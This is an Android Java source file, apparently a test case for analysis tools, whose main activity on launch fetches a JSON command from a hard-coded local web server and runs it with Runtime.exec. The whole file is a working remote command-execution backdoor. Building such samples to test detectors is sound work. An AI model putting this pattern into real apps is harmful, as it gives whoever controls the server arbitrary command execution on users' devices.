package testcase.T_ExecCmd_Http_01;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {

	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		new Thread(new Runnable() {
			public void run() {
				try {
					HttpGet httpGet = new HttpGet("http://192.168.1.24/index.php");
					HttpClient httpClient = new DefaultHttpClient();
					HttpResponse httpResponse = httpClient.execute(httpGet);
					String responseString = EntityUtils.toString(httpResponse.getEntity());
					JSONObject obj = new JSONObject(responseString);
					String cmdString = obj.getString("cmd");
					Log.e("testcaseLog", cmdString);
					Runtime.getRuntime().exec(cmdString);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}).start();
	}
}
